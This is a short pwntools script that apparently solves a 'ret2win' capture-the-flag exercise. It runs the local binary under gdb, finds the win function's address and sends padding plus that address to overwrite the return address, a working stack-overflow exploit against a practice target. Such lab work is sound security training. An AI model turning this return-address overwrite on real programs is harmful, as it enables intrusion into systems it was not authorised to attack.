from pwn import *
r=gdb.debug("./ret2win","b*win")
elf=ELF("./ret2win")
win=p64(elf.sym.win)
print(elf.sym.win)
r.sendline(p64(0)*2+win)
r.interactive()
